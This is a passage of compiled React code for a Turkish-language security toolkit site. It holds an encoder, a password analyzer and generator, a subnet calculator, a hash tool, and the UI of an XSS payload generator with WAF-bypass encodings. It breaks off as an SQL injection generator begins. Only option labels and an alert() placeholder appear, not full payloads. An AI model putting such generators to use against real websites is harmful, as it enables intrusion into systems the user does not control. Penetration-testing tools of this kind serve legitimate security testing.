/* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Farkl\u0131 kodlama bi\xE7imleri (Base64, URL, Hex, Binary, HTML) aras\u0131nda metinlerinizi anl\u0131k olarak d\xF6n\xFC\u015Ft\xFCr\xFCn."), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs font-mono uppercase text-[#5c8a74] mb-2" }, "D\xF6n\xFC\u015Ft\xFCrme Format\u0131"), /* @__PURE__ */ React.createElement("select", { value: encFormat, onChange: (e) => setEncFormat(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" }, /* @__PURE__ */ React.createElement("option", { value: "base64" }, "Base64 (Metin standard\u0131)"), /* @__PURE__ */ React.createElement("option", { value: "url" }, "URL Encoding (Web URL parametreleri)"), /* @__PURE__ */ React.createElement("option", { value: "hex" }, "Hexadecimal (Onalt\u0131l\u0131k taban)"), /* @__PURE__ */ React.createElement("option", { value: "binary" }, "Binary (\u0130kilik taban - 8-bit)"), /* @__PURE__ */ React.createElement("option", { value: "html" }, "HTML Entities (\xD6zel karakter kodlama)"))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs font-mono uppercase text-[#5c8a74] mb-2" }, "\u0130\u015Flem Y\xF6n\xFC"), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-2 gap-2" }, /* @__PURE__ */ React.createElement("button", { onClick: () => setEncMode("encode"), className: `py-2 border font-mono text-xs rounded-lg transition-colors ${encMode === "encode" ? "bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]" : "border-[#103a26] text-[#74998a] hover:text-[#cdeede]"}` }, "Kodla (Encode)"), /* @__PURE__ */ React.createElement("button", { onClick: () => setEncMode("decode"), className: `py-2 border font-mono text-xs rounded-lg transition-colors ${encMode === "decode" ? "bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]" : "border-[#103a26] text-[#74998a] hover:text-[#cdeede]"}` }, "Kodu \xC7\xF6z (Decode)")))), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-6 items-stretch mb-6" }, /* @__PURE__ */ React.createElement("div", { className: "flex flex-col" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2" }, /* @__PURE__ */ React.createElement("span", null, "Girdi Metni"), /* @__PURE__ */ React.createElement("span", null, encText.length, " karakter")), /* @__PURE__ */ React.createElement("textarea", { value: encText, onChange: (e) => setEncText(e.target.value), rows: "8", className: "w-full flex-1 bg-[#020806] border border-[#103a26] rounded-xl p-4 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm resize-none", placeholder: "\u015Eifrelenecek veya kodu \xE7\xF6z\xFClecek metni yaz\u0131n\u2026" })), /* @__PURE__ */ React.createElement("div", { className: "flex flex-col" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2" }, /* @__PURE__ */ React.createElement("span", null, "\xC7\u0131kt\u0131 Metni"), /* @__PURE__ */ React.createElement("span", null, encResult.length, " karakter")), /* @__PURE__ */ React.createElement("div", { className: "relative flex-1 flex flex-col" }, /* @__PURE__ */ React.createElement("textarea", { readOnly: true, value: encResult, rows: "8", className: "w-full flex-1 bg-[#020806] border border-[#103a26] rounded-xl p-4 text-[#00ff88] focus:outline-none font-mono text-sm resize-none", placeholder: "Sonu\xE7 burada belirecektir\u2026" }), /* @__PURE__ */ React.createElement("div", { className: "absolute right-3 bottom-3 flex gap-2" }, /* @__PURE__ */ React.createElement("button", { onClick: swapEncoder, className: "px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors" }, "Swap \u{1F501}"), /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(encResult, "encoder"), className: "px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors" }, copied === "encoder" ? "\u2713 Kopyaland\u0131!" : "\u{1F4CB} Kopyala")))))), slug === "password-strength" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F511} Parola G\xFCvenli\u011Fi & Entropi Analiz\xF6r\xFC"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "\u015Eifrenizin kaba kuvvet (brute force) sald\u0131r\u0131lar\u0131na kar\u015F\u0131 ne kadar s\xFCre dayanaca\u011F\u0131n\u0131 hesaplay\u0131n ve g\xFCvenli \u015Fifreler olu\u015Fturun."), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 lg:grid-cols-2 gap-8" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h3", { className: "text-lg font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2" }, "Parola Analizcisi"), /* @__PURE__ */ React.createElement("div", { className: "mb-4" }, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Test Edilecek \u015Eifre"), /* @__PURE__ */ React.createElement("div", { className: "relative" }, /* @__PURE__ */ React.createElement("input", { type: showPass ? "text" : "password", value: passInput, onChange: (e) => setPassInput(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg pl-4 pr-12 py-3 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "\u015Eifrenizi yaz\u0131n\u2026" }), /* @__PURE__ */ React.createElement("button", { onClick: () => setShowPass((o) => !o), className: "absolute right-3 top-1/2 -translate-y-1/2 text-sm text-[#74998a] hover:text-[#00ff88] font-mono" }, showPass ? "Gizle" : "G\xF6ster"))), passAnalysis ? /* @__PURE__ */ React.createElement("div", { className: "space-y-4" }, /* @__PURE__ */ React.createElement("div", { className: "space-y-1" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between text-xs font-mono" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "Entropi G\xFCc\xFC:"), /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88] font-bold" }, passAnalysis.entropy, " bits")), /* @__PURE__ */ React.createElement("div", { className: "h-2.5 rounded-full bg-[#0c2719] overflow-hidden" }, /* @__PURE__ */ React.createElement("div", { className: "h-full rounded-full transition-all duration-300 bg-gradient-to-r from-red-500 via-yellow-400 to-[#00ff88]", style: { width: `${Math.min(100, passAnalysis.entropy / 128 * 100)}%` } })), /* @__PURE__ */ React.createElement("div", { className: `mt-2 border rounded-lg p-3 text-sm font-mono text-center font-bold ${passAnalysis.color}` }, "Derece: ", passAnalysis.level)), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#0c2719] p-4 bg-[#020806] text-xs font-mono space-y-2" }, /* @__PURE__ */ React.createElement("div", { className: "text-[#5c8a74] border-b border-[#0c2719] pb-1.5 uppercase font-bold" }, "Karakter Analizi"), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", null, "[a-z] K\xFC\xE7\xFCk Harf:"), /* @__PURE__ */ React.createElement("span", { className: passAnalysis.hasLower ? "text-[#00ff88]" : "text-red-500" }, passAnalysis.hasLower ? "\u2713 Var" : "\u2717 Yok")), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", null, "[A-Z] B\xFCy\xFCk Harf:"), /* @__PURE__ */ React.createElement("span", { className: passAnalysis.hasUpper ? "text-[#00ff88]" : "text-red-500" }, passAnalysis.hasUpper ? "\u2713 Var" : "\u2717 Yok")), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", null, "[0-9] Rakam:"), /* @__PURE__ */ React.createElement("span", { className: passAnalysis.hasNumber ? "text-[#00ff88]" : "text-red-500" }, passAnalysis.hasNumber ? "\u2713 Var" : "\u2717 Yok")), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", null, "[!@#$] \xD6zel Karakter:"), /* @__PURE__ */ React.createElement("span", { className: passAnalysis.hasSymbol ? "text-[#00ff88]" : "text-red-500" }, passAnalysis.hasSymbol ? "\u2713 Var" : "\u2717 Yok")), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between border-t border-[#0c2719] pt-1.5 text-[#cdeede]" }, /* @__PURE__ */ React.createElement("span", null, "Toplam Karakter Havuzu:"), /* @__PURE__ */ React.createElement("span", null, passAnalysis.poolSize))), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#0c2719] p-4 bg-[#020806] text-xs font-mono space-y-2" }, /* @__PURE__ */ React.createElement("div", { className: "text-[#5c8a74] border-b border-[#0c2719] pb-1.5 uppercase font-bold" }, "K\u0131r\u0131lma S\xFCresi Tahminleri"), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", null, "Web Giri\u015F Sald\u0131r\u0131s\u0131 (100 tahmin/sn):"), /* @__PURE__ */ React.createElement("span", { className: "text-orange-400 font-bold" }, formatTime(passAnalysis.crackTimes.online))), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", null, "Lokal Standart CPU (1M tahmin/sn):"), /* @__PURE__ */ React.createElement("span", { className: "text-yellow-400 font-bold" }, formatTime(passAnalysis.crackTimes.offlineSlow))), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", null, "Profesyonel GPU K\xFCmesi (10B tahmin/sn):"), /* @__PURE__ */ React.createElement("span", { className: "text-red-400 font-bold" }, formatTime(passAnalysis.crackTimes.offlineFast))))) : /* @__PURE__ */ React.createElement("div", { className: "text-center py-10 border border-dashed border-[#103a26] rounded-xl text-sm text-[#74998a] font-mono" }, "Analiz etmek i\xE7in \u015Fifre girin.")), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h3", { className: "text-lg font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2" }, "G\xFCvenli \u015Eifre Olu\u015Fturucu"), /* @__PURE__ */ React.createElement("div", { className: "space-y-4" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between text-sm text-[#cdeede] font-mono mb-2" }, /* @__PURE__ */ React.createElement("span", null, "\u015Eifre Uzunlu\u011Fu:"), /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88] font-bold" }, genLen, " karakter")), /* @__PURE__ */ React.createElement("input", { type: "range", min: "6", max: "64", value: genLen, onChange: (e) => setGenLen(parseInt(e.target.value)), className: "w-full accent-[#00ff88]" })), /* @__PURE__ */ React.createElement("div", { className: "space-y-2 border border-[#0c2719] rounded-xl p-4 bg-[#020806]" }, /* @__PURE__ */ React.createElement("label", { className: "flex items-center gap-2.5 text-sm font-mono text-[#74998a] hover:text-[#eafff5] cursor-pointer" }, /* @__PURE__ */ React.createElement("input", { type: "checkbox", checked: genLower, onChange: (e) => setGenLower(e.target.checked), className: "rounded border-[#103a26] text-[#00ff88] focus:ring-0 focus:ring-offset-0 bg-transparent w-4 h-4" }), "K\xFC\xE7\xFCk Harf [a-z]"), /* @__PURE__ */ React.createElement("label", { className: "flex items-center gap-2.5 text-sm font-mono text-[#74998a] hover:text-[#eafff5] cursor-pointer" }, /* @__PURE__ */ React.createElement("input", { type: "checkbox", checked: genUpper, onChange: (e) => setGenUpper(e.target.checked), className: "rounded border-[#103a26] text-[#00ff88] focus:ring-0 focus:ring-offset-0 bg-transparent w-4 h-4" }), "B\xFCy\xFCk Harf [A-Z]"), /* @__PURE__ */ React.createElement("label", { className: "flex items-center gap-2.5 text-sm font-mono text-[#74998a] hover:text-[#eafff5] cursor-pointer" }, /* @__PURE__ */ React.createElement("input", { type: "checkbox", checked: genNum, onChange: (e) => setGenNum(e.target.checked), className: "rounded border-[#103a26] text-[#00ff88] focus:ring-0 focus:ring-offset-0 bg-transparent w-4 h-4" }), "Say\u0131lar [0-9]"), /* @__PURE__ */ React.createElement("label", { className: "flex items-center gap-2.5 text-sm font-mono text-[#74998a] hover:text-[#eafff5] cursor-pointer" }, /* @__PURE__ */ React.createElement("input", { type: "checkbox", checked: genSym, onChange: (e) => setGenSym(e.target.checked), className: "rounded border-[#103a26] text-[#00ff88] focus:ring-0 focus:ring-offset-0 bg-transparent w-4 h-4" }), "\xD6zel Karakterler (!@#$)")), /* @__PURE__ */ React.createElement("button", { onClick: handleGeneratePass, className: "w-full py-3 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-lg hover:shadow-[0_0_20px_-4px_var(--glow)] transition-all" }, "\u015Eifre \xDCret \u26A1"), genResult && /* @__PURE__ */ React.createElement("div", { className: "relative" }, /* @__PURE__ */ React.createElement("input", { readOnly: true, value: genResult, className: "w-full bg-[#020806] border border-[#103a26] rounded-lg pl-4 pr-12 py-3.5 text-[#00ff88] font-mono text-sm focus:outline-none" }), /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(genResult, "genPass"), className: "absolute right-3 top-1/2 -translate-y-1/2 px-2 py-1 bg-black border border-[#103a26] hover:border-[#00ff88] text-xs font-mono text-[#00ff88] rounded transition-all" }, copied === "genPass" ? "\u2713 Kopyaland\u0131!" : "\u{1F4CB} Kopyala")))))), slug === "subnet-calc" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F310} CIDR & Subnet Hesaplay\u0131c\u0131"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "IP adresinizi ve alt a\u011F maskenizi (CIDR) girerek, a\u011F yap\u0131land\u0131rmalar\u0131n\u0131 ve binary hizalamalar\u0131n\u0131 live hesaplay\u0131n."), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "IP Adresi"), /* @__PURE__ */ React.createElement("input", { value: subnetIp, onChange: (e) => setSubnetIp(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "192.168.1.1" })), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Alt A\u011F Maskesi (CIDR)"), /* @__PURE__ */ React.createElement("select", { value: subnetCidr, onChange: (e) => setSubnetCidr(parseInt(e.target.value)), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" }, Array.from({ length: 33 }).map((_, i) => {
        const mask = i === 0 ? 0 : ~0 << 32 - i >>> 0;
        const maskStr = [
          mask >>> 24 & 255,
          mask >>> 16 & 255,
          mask >>> 8 & 255,
          mask & 255
        ].join(".");
        return /* @__PURE__ */ React.createElement("option", { key: i, value: i }, "/", i, " (", maskStr, ")");
      })))), subnetResult.error ? /* @__PURE__ */ React.createElement("div", { className: "border border-red-500/20 bg-red-500/5 text-red-500 p-4 rounded-xl text-center text-sm font-mono" }, subnetResult.error) : /* @__PURE__ */ React.createElement("div", { className: "space-y-6" }, /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4" }, [
        { label: "A\u011F Adresi (Network IP)", val: subnetResult.netAddr },
        { label: "Yay\u0131m Adresi (Broadcast IP)", val: subnetResult.broadAddr },
        { label: "Alt A\u011F Maskesi (Subnet Mask)", val: subnetResult.netMask },
        { label: "Kullan\u0131labilir IP Aral\u0131\u011F\u0131", val: `${subnetResult.firstUsable} - ${subnetResult.lastUsable}` },
        { label: "Kullan\u0131labilir Cihaz Say\u0131s\u0131", val: subnetResult.usableHosts.toLocaleString("tr-TR") },
        { label: "IP S\u0131n\u0131f\u0131 (Class)", val: subnetResult.ipClass }
      ].map((res, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "border border-[#0c2719] bg-[#020806] rounded-xl p-4 font-mono" }, /* @__PURE__ */ React.createElement("div", { className: "text-[10px] text-[#74998a] uppercase tracking-wider mb-1" }, res.label), /* @__PURE__ */ React.createElement("div", { className: "text-sm font-bold text-[#eafff5] select-all" }, res.val)))), /* @__PURE__ */ React.createElement("div", { className: "border border-[#103a26] bg-black/40 rounded-xl p-5 font-mono text-xs" }, /* @__PURE__ */ React.createElement("h3", { className: "text-sm font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2" }, "Binary G\xF6rselle\u015Ftirme"), /* @__PURE__ */ React.createElement("div", { className: "space-y-3" }, /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-[80px_1fr] gap-4 items-center" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "IP Adresi:"), /* @__PURE__ */ React.createElement("div", { className: "text-[13px] tracking-wide select-all" }, formatBin(subnetResult.ipBin, subnetCidr))), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-[80px_1fr] gap-4 items-center border-t border-[#0c2719]/40 pt-3" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "Alt A\u011F:"), /* @__PURE__ */ React.createElement("div", { className: "text-[13px] tracking-wide select-all" }, formatBin(subnetResult.maskBin, subnetCidr)))), /* @__PURE__ */ React.createElement("div", { className: "mt-5 pt-3 border-t border-[#0c2719] flex items-center gap-4 text-[10px] text-[#74998a]" }, /* @__PURE__ */ React.createElement("span", { className: "flex items-center gap-1.5" }, /* @__PURE__ */ React.createElement("span", { className: "w-2 h-2 rounded bg-[#00ff88]" }), "A\u011F Segmenti (Network Bitleri)"), /* @__PURE__ */ React.createElement("span", { className: "flex items-center gap-1.5" }, /* @__PURE__ */ React.createElement("span", { className: "w-2 h-2 rounded bg-[#547464]" }), "Cihaz Segmenti (Host Bitleri)"))))), slug === "hash-tool" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F9EE} Hash Olu\u015Fturucu ve Tan\u0131mlay\u0131c\u0131"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Verilerinizin MD5, SHA-1, SHA-256 ve SHA-512 \xF6zet \xE7\u0131kt\u0131lar\u0131n\u0131 olu\u015Fturun veya bilinmeyen hash formatlar\u0131n\u0131 tespit edin."), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 lg:grid-cols-2 gap-8" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h3", { className: "text-lg font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2" }, "Hash Olu\u015Fturucu"), /* @__PURE__ */ React.createElement("div", { className: "space-y-4" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Girdi Verisi (Metin)"), /* @__PURE__ */ React.createElement("textarea", { value: hashInput, onChange: (e) => setHashInput(e.target.value), rows: "3", className: "w-full bg-[#020806] border border-[#103a26] rounded-lg p-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm resize-none", placeholder: "Hash \xE7\u0131kt\u0131s\u0131 \xFCretmek istedi\u011Finiz metni girin\u2026" })), /* @__PURE__ */ React.createElement("div", { className: "space-y-3.5" }, [
        { label: "MD5", val: hMd5 },
        { label: "SHA-1", val: hSha1 },
        { label: "SHA-256", val: hSha256 },
        { label: "SHA-512", val: hSha512 }
      ].map((h, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "border border-[#0c2719] bg-[#020806] rounded-xl p-3 font-mono relative" }, /* @__PURE__ */ React.createElement("div", { className: "text-[10px] text-[#74998a] uppercase mb-1" }, h.label), /* @__PURE__ */ React.createElement("div", { className: "text-xs font-bold text-[#00ff88] select-all break-all pr-12 min-h-[16px]" }, h.val || ""), h.val && /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(h.val, "hash-" + h.label), className: "absolute right-2 top-2 px-2 py-1 bg-black border border-[#103a26] text-[10px] text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88] rounded transition-all" }, copied === "hash-" + h.label ? "\u2713" : "\u{1F4CB}")))))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h3", { className: "text-lg font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2" }, "Hash Tan\u0131mlay\u0131c\u0131 & Analiz\xF6r"), /* @__PURE__ */ React.createElement("div", { className: "space-y-4" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Bilinmeyen Hash \u0130mzas\u0131"), /* @__PURE__ */ React.createElement("input", { value: detectInput, onChange: (e) => setDetectInput(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "Taramak istedi\u011Finiz hash de\u011Ferini girin\u2026" })), detectedHashes ? /* @__PURE__ */ React.createElement("div", { className: "space-y-3.5" }, /* @__PURE__ */ React.createElement("div", { className: "text-xs font-mono text-[#74998a]" }, "Bulunan E\u015Fle\u015Fmeler:"), detectedHashes.map((res, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "border border-[#103a26] rounded-xl p-4 bg-[rgba(0,255,136,.02)] space-y-2" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between items-center" }, /* @__PURE__ */ React.createElement("span", { className: "font-disp font-bold text-[#eafff5] text-sm" }, res.name), /* @__PURE__ */ React.createElement("span", { className: `text-[10px] font-mono px-2 py-0.5 rounded border ${res.conf === "\xC7ok Y\xFCksek" ? "border-emerald-500/20 text-emerald-400 bg-emerald-500/5" : res.conf === "Y\xFCksek" ? "border-[#00ff88]/20 text-[#00ff88] bg-[#00ff88]/5" : res.conf === "Orta" ? "border-yellow-500/20 text-yellow-400 bg-yellow-500/5" : "border-red-500/20 text-red-400 bg-red-500/5"}` }, res.conf, " E\u015Fle\u015Fme")), /* @__PURE__ */ React.createElement("p", { className: "text-xs text-[#74998a] leading-relaxed font-mono" }, res.desc)))) : /* @__PURE__ */ React.createElement("div", { className: "text-center py-10 border border-dashed border-[#103a26] rounded-xl text-sm text-[#74998a] font-mono" }, "Tan\u0131mlamak istedi\u011Finiz hash de\u011Ferini yap\u0131\u015Ft\u0131r\u0131n."))))), slug === "xss-generator" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F9EA} XSS Payload Olu\u015Fturucu"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Farkl\u0131 XSS ba\u011Flamlar\u0131na (HTML, \xD6znitelik, Javascript) ve WAF filtre atlatma y\xF6ntemlerine uygun dinamik payload'lar \xFCretin."), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Payload Tipi / Ba\u011Flam\u0131"), /* @__PURE__ */ React.createElement("select", { value: xssPayloadType, onChange: (e) => setXssPayloadType(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" }, /* @__PURE__ */ React.createElement("option", { value: "html" }, "HTML Etiketi (<script>)"), /* @__PURE__ */ React.createElement("option", { value: "img" }, "G\xF6rsel Olay Tetikleyici (<img onerror>)"), /* @__PURE__ */ React.createElement("option", { value: "svg" }, "SVG Olay Tetikleyici (<svg onload>)"), /* @__PURE__ */ React.createElement("option", { value: "body" }, "G\xF6vde Y\xFCkleme Olay\u0131 (<body onload>)"), /* @__PURE__ */ React.createElement("option", { value: "iframe" }, "Iframe Kayna\u011F\u0131 (<iframe src=javascript>)"), /* @__PURE__ */ React.createElement("option", { value: "attribute" }, 'Etiket \xD6zniteli\u011Fi \xC7\u0131k\u0131\u015F\u0131 (" onmouseover=)'), /* @__PURE__ */ React.createElement("option", { value: "javascript-context" }, "Javascript Dize Ba\u011Flam\u0131 ('-alert()-')"), /* @__PURE__ */ React.createElement("option", { value: "polyglot" }, "XSS Polyglot (\xC7oklu Ba\u011Flam)"))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Filtre Atlatma (WAF Bypass)"), /* @__PURE__ */ React.createElement("select", { value: xssFilterBypass, onChange: (e) => setXssFilterBypass(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" }, /* @__PURE__ */ React.createElement("option", { value: "none" }, "Yok (D\xFCz Metin)"), /* @__PURE__ */ React.createElement("option", { value: "html-entity" }, "HTML Entity (Ondal\u0131k Kodlama)"), /* @__PURE__ */ React.createElement("option", { value: "string-fromcharcode" }, "String.fromCharCode() D\xF6n\xFC\u015F\xFCm\xFC"), /* @__PURE__ */ React.createElement("option", { value: "url" }, "URL Encoding (Y\xFCzde Kodlama)")))), /* @__PURE__ */ React.createElement("div", { className: "mb-6" }, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "\xC7al\u0131\u015Ft\u0131r\u0131lacak JavaScript Kodu"), /* @__PURE__ */ React.createElement("input", { value: xssCustomParam, onChange: (e) => setXssCustomParam(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "alert(document.domain)" })), /* @__PURE__ */ React.createElement("div", { className: "relative mb-6" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2" }, /* @__PURE__ */ React.createElement("span", null, "Olu\u015Fturulan XSS Payload"), /* @__PURE__ */ React.createElement("span", null, getXssPayload().length, " karakter")), /* @__PURE__ */ React.createElement("div", { className: "absolute right-3 top-8 z-10" }, /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(getXssPayload(), "xss"), className: "px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors" }, copied === "xss" ? "\u2713 Kopyaland\u0131!" : "\u{1F4CB} Kopyala")), /* @__PURE__ */ React.createElement("pre", { className: "bg-[#020806] border border-[#103a26] rounded-xl p-5 pt-12 overflow-x-auto text-sm text-[#eafff5] font-mono whitespace-pre-wrap break-all min-h-[100px]" }, getXssPayload())), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#103a26] p-4 bg-[rgba(0,255,136,.02)] text-xs text-[#74998a] space-y-2 leading-relaxed" }, /* @__PURE__ */ React.createElement("div", { className: "font-bold text-[#00ff88]" }, "\u{1F4A1} G\xFCvenlik Bilgisi:"), /* @__PURE__ */ React.createElement("div", null, "XSS (Cross-Site Scripting), sald\u0131rgan\u0131n hedef web sitesine zararl\u0131 istemci tarafl\u0131 betikler enjekte etmesine olanak tan\u0131r. Filtre atlatma modlar\u0131, girdi do\u011Frulama mekanizmalar\u0131n\u0131 veya web uygulama g\xFCvenlik duvarlar\u0131n\u0131 (WAF) test etmek ve a\u015Fmak amac\u0131yla kullan\u0131l\u0131r."))), slug === "sqli-generator" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F489} SQL Injection Jenerat\xF6r\xFC"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Farkl\u0131 veritaban\u0131 y\xF6netim sistemlerine (DBMS) ve SQL enjeksiyon t\xFCrlerine uygun test payload'lar\u0131 haz\u0131rlay\u0131n."), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Hedef Veritaban\u0131 (DBMS)"), /* @__PURE__ */ React.createElement("select", { value: sqliDbms, onChange: (e) => setSqliDbms(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" }, /* @__PURE__ */ React.createElement("option", { value: "mysql" }, "MySQL / MariaDB"), /* @__PURE__ */ React.createElement("option", { value: "postgresql" }, "PostgreSQL"), /* @__PURE__ */ React.createElement("option", { value: "mssql" }, "Microsoft SQL Server"), /* @__PURE__ */ React.createElement("option", { value: "oracle" }, "Oracle Database"))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "SQL Injection Tipi"), /* @__PURE__ */ React.createElement("select", { value: sqliType, 